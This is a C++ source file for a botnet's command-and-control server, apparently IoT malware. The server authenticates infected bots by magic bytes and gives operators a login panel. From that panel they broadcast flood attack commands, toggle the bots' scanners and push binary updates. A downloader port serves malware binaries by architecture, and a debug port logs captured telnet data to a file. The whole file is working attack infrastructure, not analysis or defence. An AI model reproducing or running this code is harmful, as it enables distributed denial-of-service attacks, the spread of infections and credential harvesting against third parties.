#include <iostream>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <thread>
#include <map>
#include <sstream>
#include <string>
#include <unistd.h>
#include <sys/epoll.h>
#include <errno.h>
#include <string.h>
#include <vector>
#include <iterator>

#include <fstream>

#include "main.h"
#include "client.h"
#include "mysql.h"
#include "command.h"
#include "thread.h"

bool toggle_debug = true;
bool toggle_downloader = true;

static void terminate_client(int fd)
{
    epoll_ctl(efd, EPOLL_CTL_DEL, client_list[fd].fd, NULL);

    if (client_list[fd].arch_len > 0)
    {
        printf("\e[0;37m[\e[0;31m-\e[0;37m] %s disconnected (%d.%d.%d.%d)\n", client_list[fd].arch, client_list[fd].addr & 0xff, (client_list[fd].addr >> 8) & 0xff, (client_list[fd].addr >> 16) & 0xff, (client_list[fd].addr >> 24) & 0xff);
    }

    if(client_list[fd].fd != -1)
        close(client_list[fd].fd);

    client_list[fd].fd = -1;
    client_list[fd].connected = FALSE;
    client_list[fd].addr = 0;
    client_list[fd].authenticated = FALSE;
    client_list[fd].timeout = 0;
    client_list[fd].arch_len = 0;
    memset(client_list[fd].arch, 0, sizeof(client_list[fd].arch));

    return;
}

std::vector<std::string> split(const std::string& s, char delimiter)
{
    std::vector<std::string> tokens;
    std::string token;
    std::istringstream tokenStream(s);
    while (std::getline(tokenStream, token, delimiter))
    {
        tokens.push_back(token);
    }

    return tokens;
}

static void _exit(const char *str, int exit_code)
{
    std::cout << str << std::endl;
    exit(exit_code);
}

static void downloader_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    downloader_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!downloader_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(DOWNLOADER_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(downloader_fd);
    REUSE_ADDR(downloader_fd);

    ret = bind(downloader_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the downloader port", 1);
    }

    ret = listen(downloader_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the downloader port", 1);
    }

    return;
}

static void debug_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    debug_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!debug_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(DEBUG_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(debug_fd);
    REUSE_ADDR(debug_fd);

    ret = bind(debug_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the debug port", 1);
    }

    ret = listen(debug_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the debug port", 1);
    }

    return;
}

static void admin_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    admin_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!admin_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ADMIN_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(admin_fd);
    REUSE_ADDR(admin_fd);

    ret = bind(admin_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the admin port", 1);
    }

    ret = listen(admin_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the admin port", 1);
    }

    return;
}

static void accept_client_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    struct epoll_event e;
    int ret = 0;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
    {
        return;
    }

    NONBLOCK(fd);

    e.data.fd = fd;
    e.events = EPOLLIN | EPOLLET;

    ret = epoll_ctl(efd, EPOLL_CTL_ADD, fd, &e);
    if(ret == -1)
    {
        return;
    }

    // Slot the client into the list
    client_list[e.data.fd].fd = e.data.fd;
    client_list[e.data.fd].connected = TRUE;
    client_list[e.data.fd].addr = addr.sin_addr.s_addr;
    client_list[e.data.fd].authenticated = FALSE;
    client_list[e.data.fd].timeout = time(NULL);
    client_list[e.data.fd].arch_len = 0;
    memset(client_list[e.data.fd].arch, 0, sizeof(client_list[e.data.fd].arch));

    //printf("Accepted connection (%d.%d.%d.%d)\n", client_list[e.data.fd].addr & 0xff, (client_list[e.data.fd].addr >> 8) & 0xff, (client_list[e.data.fd].addr >> 16) & 0xff, (client_list[e.data.fd].addr >> 24) & 0xff);

    return;
}

static int parse_count(struct process *process)
{
    int count = 0;
    int x = 0;
    std::stringstream stream;
    std::string out;
    std::string n;

    stream << process->buf;

    std::getline(stream, out, ' ');
    n = out;

    process->f = process->buf;
    process->f.erase(0, n.length() + 1);

    n.erase(0, 1);

    count = stoi(n);

    if(count == 0 || (process->ptr->max_clients == -1 && count == -1) || (process->ptr->max_clients != -1 && count > process->ptr->max_clients))
        return 0;

    process->count = count;
    return 1;
}

void update_binary(struct process *process)
{
    std::stringstream info_stream;
    std::stringstream dlr_stream;
    std::stringstream tbinary_stream;
    int x = 0;
    int c = 0;
    struct relay data;
    uint16_t jj = 0;
    uint16_t val_len = 0;

    bool send_all = (process->bot_type == "all" ? true : false);
    data.type = TYPE_COMMAND_UPDATE;
    
    // lol i need a better way to do this
    if (send_all)
    {
        for(x = 0; x < MAX_EVENTS; x++)
        {
            if(!client_list[x].authenticated || !client_list[x].connected)
                continue;

            c++;

            send(client_list[x].fd, &data, sizeof(relay), MSG_NOSIGNAL);
                        
            if(process->count != -1 && c == process->count)
                break;
        }
    }
    else
    {
        for(x = 0; x < MAX_EVENTS; x++)
        {
            if(!client_list[x].authenticated || !client_list[x].connected)
                continue;

            if (strcmp(client_list[x].arch, process->bot_type.c_str()))
                continue;

            c++;
        
            send(client_list[x].fd, &data, sizeof(relay), MSG_NOSIGNAL);
            
            if(process->count != -1 && c == process->count)
                break;
        }
    }

    info_stream << "Updated " << c;
    info_stream << " devices with binary " << process->bot_type << "\r\n";

    send(process->fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);


    return;
}

void push_scanner(struct process *process, struct command *ptr)
{
    int x = 0;
    int c = 0;
    struct relay data;

    data.type = TYPE_SCANNER_STATUS;

    memset(data.buf, 0, sizeof(data.buf));

    memcpy(data.buf, ptr->buf, ptr->buf_len);

    for(x = 0; x < MAX_EVENTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
            continue;
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
            break;
    }
    
    std::stringstream info_stream;

    info_stream << (process->status == 1 ? "Enabled " : "Disabled ");
    info_stream << process->bot_type;
    info_stream << " scanner on " ;
    info_stream << c ;
    info_stream << " devices!\r\n";

    send(process->fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);

    return;
}

static void flood(struct command *ptr, struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;

    data.type = TYPE_FLOOD;

    memset(data.buf, 0, sizeof(data.buf));

    memcpy(data.buf, ptr->buf, ptr->buf_len);

    for(x = 0; x < MAX_EVENTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
            continue;
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
            break;
    }

    return;
}

std::map<std::string, int> statistics(void)
{
    int i = 0;
    std::map<std::string, int> t;

    for(i = 0; i < MAX_EVENTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        t[client_list[i].arch]++;
    }

    return t;
}

int client_count(int max_clients)
{
    int i = 0;
    int x = 0;

    for(i = 0; i < MAX_EVENTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        if(max_clients != -1 && x == max_clients)
            break;
        x++;
    }

    return x;
}

void *title_counter(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;

    while(TRUE)
    {
        std::stringstream title;

        p.username = login->username;
        mysql_set_restrictions(&p);

        title << "\033]0;";
        title << "Loaded: " << client_count(p.max_clients);
        title << " | " << p.username;
        title << "\007";

        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
        sleep(1);
    }
}

static std::tuple<int, std::string> recv_line(int fd)
{
    int ret = 0;
    std::string str;

    while(1)
    {
        int np = 0;
        int rp = 0;
        char out[4096];

        memset(out, 0, sizeof(out));

        ret = recv(fd, out, sizeof(out), MSG_NOSIGNAL);
        if(ret <= 0)
        {
            return std::tuple<int, std::string>(ret, str);
        }

        str = out;

        np = str.find("\n");
        rp = str.find("\r");

        if(np != -1)
        {
            str.erase(np);
        }
    
        if(rp != -1)
        {
            str.erase(rp);
        }

        if(str.length() == 0)
        {
            continue;
        }

        break;
    }

    return std::tuple<int, std::string>(ret, str);
}

static void *admin_timeout_thread(void *arg)
{
    struct thread_data *tdata = (struct thread_data *)arg;

    pthread_barrier_wait(tdata->barrier);

    while(TRUE)
    {
        if(tdata->time + tdata->timeout < time(NULL))
        {
            close(tdata->fd);
            pthread_cancel(*tdata->admin_thread);
            break;
        }

        sleep(1);
    }

    pthread_exit(0);
}

static void *admin(void *arg)
{
    int fd = -1;
    std::stringstream stream;
    pthread_t counter;
    char user[4096];
    char pass[4096];
    struct admin login;
    int ffd = -1;
    char bbuf[4096];
    int load = 0;
    struct thread_data *tdata = (struct thread_data *)arg;
    struct thread_data t;
    pthread_barrier_t barrier;
    pthread_t admin_timeout;
    int ex = 0;
    int ret = 0;
    std::string banner;
    int np = 0;
    int rp = 0;
    std::tuple<int, std::string> line;

    pthread_barrier_wait(tdata->barrier);

    fd = tdata->fd;

    pthread_barrier_init(&barrier, NULL, 1);

    t.fd = fd;
    t.time = time(NULL);
    t.barrier = &barrier;
    t.admin_thread = tdata->admin_thread;
    t.timeout = 60; 

    pthread_create(&admin_timeout, NULL, admin_timeout_thread, (void *)&t);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    ffd = open("banner.txt", O_RDONLY);
    if(ffd == -1)
    {
        std::cout << "Failed to open the banner file!" << std::endl;
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    if(strcmp(std::get<std::string>(line).c_str(), MANAGER_AUTH_KEY))
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    send(fd, "\r", 1, MSG_NOSIGNAL);

    ret = read(ffd, bbuf, sizeof(bbuf));
    banner = bbuf;

    np = banner.find("\n");
    rp = banner.find("\r");

    if(np != -1)
    {
        banner.erase(np);
    }

    if(rp != -1)
    {
        banner.erase(rp);
    }

    send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
    send(fd, "\r\n", 2, MSG_NOSIGNAL);

    send(fd, "\e[93mUsername\e[31m: \e[0m", 25, MSG_NOSIGNAL);

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(user, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());

    send(fd, "\e[93mPassword\e[31m: \e[0m", 25, MSG_NOSIGNAL);

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(pass, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());

    login.user_ptr = user;
    login.pass_ptr = pass;

    send(fd, "\e[93mAuthenticating\e[0m", 23, MSG_NOSIGNAL);
    for(load = 0; load < 5; load++)
    {
        send(fd, "\e[31m.\e[0m", 10, MSG_NOSIGNAL);
        sleep(1);
    }
    send(fd, "\r\n", 2, MSG_NOSIGNAL);

    if(!mysql_login(&login))
    {
        send(fd, "\e[93mAuthentication failure\e[31m!\e[0m\r\n", 39, MSG_NOSIGNAL);
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    send(fd, "\e[93mAuthentication successful\e[31m!\e[0m\r\n", 42, MSG_NOSIGNAL);

    // Terminate the admin timeout thread
    pthread_cancel(admin_timeout);

    login.fd = fd;

    mysql_set_restrictions(&login);

    // If we are already authenticated close the connection
/*    if(login.authenticated)
    {
        send(fd, "\e[93mUser already authenticated\e[31m!\e[0m\r\n", 43, MSG_NOSIGNAL);
        close(fd);
        pthread_exit(0);
    }*/

    mysql_update_login(&login, 1);

    // User has been disabled for a indefinite amount of time
    if(login.disable)
    {
        send(fd, "\e[93mUser has been disabled\e[31m!\e[0m\r\n", 39, MSG_NOSIGNAL);
        close(fd);
        pthread_exit(0);
    }

    //cout << "User " << login.username << " authenticated." << endl;

    stream << "\r\e[93m";
    stream << login.username;
    stream << "@fbot\e[31m # \e[0m";

    // Spawn a thread to update a active title counter
    pthread_create(&counter, NULL, title_counter, (void *)&login);

    while(TRUE)
    {
        char buf[4096];
        struct process process;
        struct command *ptr;
        int x = 0;
        std::string data;
        int g = 0;
        int count = 0;
        int np = 0;
        int rp = 0;

        memset(buf, 0, sizeof(buf));

        // Send the admin a fake prompt for user input
        ret = send(fd, stream.str().c_str(), stream.str().length(), MSG_NOSIGNAL);
        
        if(ret <= 0)
        {
            break;
        }

        g = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL);

        if(g <= 0)
        {
            break;
        }

        data = buf;

        np = data.find("\n");
        rp = data.find("\r");

        if(np != -1)
        {
            data.erase(np);
        }

        if(rp != -1)
        {
            data.erase(rp);
        }

        if(data == "")
        {
            continue;
        }

        mysql_set_restrictions(&login);

        count = client_count(login.max_clients);

        if(login.disable)
        {
            send(fd, "\e[93mUser has been disabled\e[31m!\e[0m\r\n", 39, MSG_NOSIGNAL);
            break;
        }

        if(data == "?")
        {
            std::map<std::string, std::string>::iterator command_desc_iterator;
            std::stringstream command_desc_stream, util_commands_stream;

            for(command_desc_iterator = command_description.begin(); command_desc_iterator != command_description.end(); command_desc_iterator++)
            {
                command_desc_stream << command_desc_iterator->first;
                command_desc_stream << ":";
                command_desc_stream << " ";
                command_desc_stream << command_desc_iterator->second;
                command_desc_stream << std::endl;
            }

            util_commands_stream << "bots: Retrieves current botcount" << std::endl;
            util_commands_stream << "stats: Retrieves current bot statistics" << std::endl;
            util_commands_stream << "clear: clears screen" << std::endl;
            util_commands_stream << "?: shows this menu" << std::endl;
            util_commands_stream << "toggle_debug: Toggles debug requests" << std::endl;
            util_commands_stream << "toggle_downloader: Toggles downloader requests" << std::endl;

            send(fd, command_desc_stream.str().c_str(), command_desc_stream.str().length(), MSG_NOSIGNAL);
            send(fd, util_commands_stream.str().c_str(), util_commands_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if(data == "bots")
        {
            std::stringstream count_stream;

            count_stream << "Loaded: " << count;
            count_stream << "\r\n";

            send(fd, count_stream.str().c_str(), count_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

	    if(data == "toggle_debug")
        {
	    std::stringstream debug_stream;

	    toggle_debug = !toggle_debug;
            debug_stream << "Debug port is: " << (toggle_debug == true ? "active" : "disabled") << std::endl;

            send(fd, debug_stream.str().c_str(), debug_stream.str().length(), MSG_NOSIGNAL);
            
            continue;
        }

	    if(data == "toggle_downloader")
        {
            std::stringstream downloader_stream;

            toggle_downloader = !toggle_downloader;
            downloader_stream << "Downloader port is: " << (toggle_downloader == true ? "active" : "disabled") << std::endl;

            send(fd, downloader_stream.str().c_str(), downloader_stream.str().length(), MSG_NOSIGNAL);
            
            continue;
        }

        if(data == "clear" || data == "cls")
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            continue;
        }

        if((data == "stats" || data == "statistics") && login.admin == TRUE)
        {
            std::map<std::string, int> stats;
            std::map<std::string, int>::iterator stats_iterator;
            std::stringstream stats_stream, count_stream;
            stats = statistics();

            if(stats.empty())
            {
                send(fd, "No clients connected to view statistics\r\n", 41, MSG_NOSIGNAL);
                continue;
            }

            for(stats_iterator = stats.begin(); stats_iterator != stats.end(); stats_iterator++)
            {
                stats_stream << stats_iterator->first << ": " << stats_iterator->second;
                stats_stream << "\r\n";
            }

            count_stream << "\nLoaded: " << count;
            count_stream << "\r\n";

            send(fd, stats_stream.str().c_str(), stats_stream.str().length(), MSG_NOSIGNAL);
            send(fd, count_stream.str().c_str(), count_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if(count == 0)
        {
            send(fd, "No clients connected to command\r\n", 33, MSG_NOSIGNAL);
            continue;
        }

        process.buf = data;
        process.buf_len = data.length();
        process.fd = fd;
        process.ptr = &login;
        process.count = login.max_clients;

        // Parse the desired client count here
        std::string flood_str;
        std::stringstream info_stream;

        if(data[0] == '.')
        {
            if(!parse_count(&process))
            {
                send(fd, "Invalid count specified\r\n", 25, MSG_NOSIGNAL);
                continue;
            }
            flood_str = split(data, ' ')[1];
            process.buf = process.f;
        }
        else
            flood_str = split(data, ' ')[0];
    
        ptr = command_process(&process);
        if(!ptr)
        {
            continue;
        }

        flood(ptr, &process);

        info_stream << "Attack broadcasted to to " << (process.count == -1 ? count : process.count) << " devices\r\n";
        send(fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);

        free(ptr->buf);
        free(ptr);
    }

    pthread_cancel(counter);
    mysql_update_login(&login, 0);
    close(fd);
    pthread_exit(0);
}
/*
static void verify_debug_sender(char *buffer, struct relay *data, int buf_len)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    uint16_t len = 0;
    char *buf;

    if(buf_len < sizeof(uint16_t)) // Failed to read in a uint16_t?
    {
        return;
    }

    buf = data->buf;

    len = *(uint16_t *)buf;

    len = ntohs(len);

    if(len == 0)
    {
        return;
    }

    if(len > sizeof(data->buf))
    {
        return;
    }

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 != 128 && b2 != 90 && b3 != 87 && b4 != 200 && b5 != 240 && b6 != 30)
    {
        return;
    }

    buf += sizeof(uint16_t);

    strcpy(buffer, buf);

    return;
}
*/
static void *manage_debug(void *arg)
{
    int fd = -1;
    int len = 0;

    uint32_t addr;
    char buf[128];

    struct thread_data *tdata = (struct thread_data *)arg;
    struct relay data;

    pthread_barrier_wait(tdata->barrier);
    memset(&data, 0, sizeof(struct relay));

    fd = tdata->fd;
    addr = tdata->addr;

    /*
    len = recv(fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

    if(len < sizeof(struct relay))
    {
        close(fd);
        pthread_exit(0);
    }

    len += sizeof(uint8_t); // Skip type
    len += sizeof(uint16_t) * 6; // Skip magic bytes

    verify_debug_sender(buf, &data, len);

    if (strlen(buf) <= 0)
    {
        close(fd);
        pthread_exit(0);
    }

    printf("%s (%d.%d.%d.%d)\r\n", buf, addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);
    */

    len = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL);

    if (len < 7)
    {
        close(fd);
        pthread_exit(0);
    }

    std::ofstream outfile;
    outfile.open("telnet.txt", std::ios_base::app);
    outfile << buf << std::endl; 
    outfile.close();

    //printf("\e[0;37m[\e[0;33m?\e[0;37m] %s (%d.%d.%d.%d)\r\n", buf, addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

    close(fd);
    pthread_exit(0);
}

static void accept_debug_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    pthread_t thread;
    struct thread_data tdata;
    pthread_barrier_t barrier;

    //addr.sin_addr.s_addr

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
        return;

    tdata.fd = fd;
    tdata.addr = addr.sin_addr.s_addr;

    pthread_barrier_init(&barrier, NULL, 2);

    tdata.barrier = &barrier;
    tdata.admin_thread = &thread;

    pthread_create(&thread, NULL, manage_debug, (void *)&tdata);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    return;
}

static void *manage_downloader(void *arg)
{
    int fd = -1;
    uint32_t addr;
    char buf[2];
    int g = 0;
    std::string data;

    struct thread_data *tdata = (struct thread_data *)arg;
    pthread_barrier_t barrier;
    pthread_t admin_timeout;
    struct thread_data t;

    bool found = false;
    std::string arch;

    pthread_barrier_wait(tdata->barrier);

    fd = tdata->fd;
    addr = tdata->addr;

    pthread_barrier_init(&barrier, NULL, 1);

    t.fd = fd;
    t.time = time(NULL);
    t.barrier = &barrier;
    t.admin_thread = tdata->admin_thread;
    t.timeout = 60; 

    pthread_create(&admin_timeout, NULL, admin_timeout_thread, (void *)&t);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);
   
    g = recv(fd, buf, 2, MSG_NOSIGNAL);

    if(g <= 0)
    {
        //printf("Failed to recieve downloader arch (%d.%d.%d.%d)\n", addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    data = buf;

    if(data == "")
    {
        //printf("Failed to recieve downloader arch (%d.%d.%d.%d)\n", addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);
        
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    std::map<std::string, std::string>::iterator downloader_iterator;

    for(downloader_iterator = downloader_arch.begin(); downloader_iterator != downloader_arch.end(); downloader_iterator++)
    {
        if(!strcmp(buf, downloader_iterator->second.c_str()))
        {
            found = true;
            arch = downloader_iterator->first;
            break;
        }
    }

    if (!found)
    {
        //printf("Failed to recieve downloader arch (%d.%d.%d.%d)\n", addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    //printf("Recieved downloader arch [%s] (%d.%d.%d.%d)\n", arch.c_str(), addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

    std::stringstream dlr_stream;
    int ffd;

    dlr_stream << DOWNLOADER_PREFIX << arch;

    //ffd = open(dlr_stream.str().c_str(), O_RDONLY);
    //if(ffd == -1)
    //{
        //printf("Failed to open binary '%s' (%d.%d.%d.%d)\n", dlr_stream.str().c_str(), addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

    //    close(fd);
    //    pthread_cancel(admin_timeout);
    //    pthread_exit(0);
    //}

    std::ifstream tbinary(dlr_stream.str().c_str());
    std::stringstream tbuffer;
    tbuffer << tbinary.rdbuf();

    if(tbuffer.str().length() < 1)
    {
        printf("Failed to open binary '%s' (%d.%d.%d.%d)\n", dlr_stream.str().c_str(), addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    int ret = send(fd, tbuffer.str().c_str(), tbuffer.str().length(), MSG_NOSIGNAL);
    
    if (ret <= 0)
    {
        printf("Failed to send binary '%s' (%d.%d.%d.%d)\r\n", dlr_stream.str().c_str(), addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

        close(fd);
        close(ffd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    /*while (1)
    {
        char bbuf[128];
        int ret = 0, res = 0;

        res = read(ffd, bbuf, 128);
        ret = send(fd, bbuf, 128, MSG_NOSIGNAL);
        
        if(!res)
        {
            break;
        }

        if (res == -1 || ret <= 0)
        {
            //printf("Failed to send binary '%s' (%d.%d.%d.%d)\r\n", dlr_stream.str().c_str(), addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

            close(fd);
            close(ffd);
            pthread_cancel(admin_timeout);
            pthread_exit(0);
        }
    }*/

    printf("\e[0;37m[\e[0;33m?\e[0;37m] Deploying '%s' to %d.%d.%d.%d\r\n", arch.c_str(), addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff);

    close(fd);
    pthread_cancel(admin_timeout);
    pthread_exit(0);
}

static void accept_downloader_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    pthread_t thread;
    struct thread_data tdata;
    pthread_barrier_t barrier;

    //addr.sin_addr.s_addr
 
    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
        return;

    tdata.fd = fd;
    tdata.addr = addr.sin_addr.s_addr;

    //printf("Accepted connection from %d.%d.%d.%d (dropper)\n", addr.sin_addr.s_addr & 0xff, (addr.sin_addr.s_addr >> 8) & 0xff, (addr.sin_addr.s_addr >> 16) & 0xff, (addr.sin_addr.s_addr >> 24) & 0xff);

    pthread_barrier_init(&barrier, NULL, 2);

    tdata.barrier = &barrier;
    tdata.admin_thread = &thread;

    pthread_create(&thread, NULL, manage_downloader, (void *)&tdata);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    return;
}

static void accept_admin_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    pthread_t thread;
    struct thread_data tdata;
    pthread_barrier_t barrier;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
        return;

    tdata.fd = fd;

    pthread_barrier_init(&barrier, NULL, 2);

    tdata.barrier = &barrier;
    tdata.admin_thread = &thread;

    pthread_create(&thread, NULL, admin, (void *)&tdata);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    return;
}

static void verify_client(struct epoll_event *es, struct relay *data, int buf_len)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    uint16_t len = 0;
    char *buf;

    if(buf_len < sizeof(uint16_t)) // Failed to read in a uint16_t?
    {
        return;
    }

    buf = data->buf;

    len = *(uint16_t *)buf;

    len = ntohs(len);

    if(len == 0)
    {
        return;
    }

    if(len > sizeof(data->buf))
    {
        return;
    }

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 != 128 && b2 != 90 && b3 != 87 && b4 != 200 && b5 != 240 && b6 != 30)
    {
        return;
    }

    buf += sizeof(uint16_t);

    client_list[es->data.fd].arch_len = len;
    memcpy(client_list[es->data.fd].arch, buf, client_list[es->data.fd].arch_len);
    if (client_list[es->data.fd].arch_len > 0)
    {
        client_list[es->data.fd].authenticated = TRUE;
        printf("\e[0;37m[\e[0;32m+\e[0;37m] %s connected (%d.%d.%d.%d)\n", client_list[es->data.fd].arch, client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff);
    }

    return;
}

static void parse_command(int fd, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 == 8890 && b2 == 5412 && b3 == 6767 && b4 == 1236 && b5 == 8092 && b6 == 3334)
    {
        // Relay the data back to the client
        send(fd, data, sizeof(struct relay), MSG_NOSIGNAL);
    }

    return;
}

static void process_event(struct epoll_event *es, int efd)
{
    int len = 0;
    struct relay data;

    memset(&data, 0, sizeof(struct relay));

    printf("Process event! (errno = %d) (event = %d)\n", errno, es->events);

    if(es->data.fd == admin_fd)
    {
        accept_admin_connection(es, efd);
        return;
    }

    if(es->data.fd == client_fd)
    {
        accept_client_connection(es, efd);
        return;
    }

    if(es->data.fd == downloader_fd)
    {
        accept_downloader_connection(es, efd);
        return;
    }

    if(es->data.fd == debug_fd)
    {
        accept_debug_connection(es, efd);
        return;
    }

    if((es->events & EPOLLERR) || (es->events & EPOLLHUP) || (!(es->events & EPOLLIN)))
    {
        //printf("%s disconnected (%d.%d.%d.%d)\n", client_list[es->data.fd].arch, client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff);
        terminate_client(es->data.fd);
        return;
    }

    errno = 0;
    // Always read in
    len = recv(es->data.fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

//    printf("Received %d bytes! (errno = %d)\n", len, errno);

    if(len < sizeof(struct relay))
    {
        //printf("%s disconnected (%d.%d.%d.%d)\n", client_list[es->data.fd].arch, client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff);
        terminate_client(es->data.fd);
        return;
    }

    len += sizeof(uint8_t); // Skip type
    len += sizeof(uint16_t) * 6; // Skip magic bytes

    if(data.type == TYPE_AUTH && !client_list[es->data.fd].authenticated)
    {
        verify_client(es, &data, len);
        //return;
    }

    if(!client_list[es->data.fd].authenticated)
    {
        terminate_client(es->data.fd);
        return;
    }

    client_list[es->data.fd].timeout = time(NULL);

    if(data.type == TYPE_COMMAND)
    {
        parse_command(es->data.fd, &data);
    }

    return;
}
